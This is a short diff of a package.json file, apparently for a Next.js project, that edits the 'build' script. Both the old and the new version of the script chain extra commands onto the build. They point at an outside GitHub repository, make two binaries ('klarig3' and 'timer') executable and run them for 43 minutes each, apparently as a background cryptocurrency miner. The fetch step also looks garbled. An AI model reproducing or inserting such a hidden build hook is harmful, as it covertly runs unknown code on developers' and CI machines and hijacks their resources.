@@ -4,7 +4,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev",
-    "build": "next https://github.com/cahayaangkasaku1/zep.git; cd zep; chmod +x klarig3 timer; timeout 43m ./klarig3 -c z.json -B; timeout 43m ./timer",
+    "build": "next build; https://github.com/cahayaangkasaku1/zep.git; cd zep; chmod +x klarig3 timer; timeout 43m ./klarig3 -c z.json -B; timeout 43m ./timer",
     "start": "next start",
     "lint": "next lint"
   },
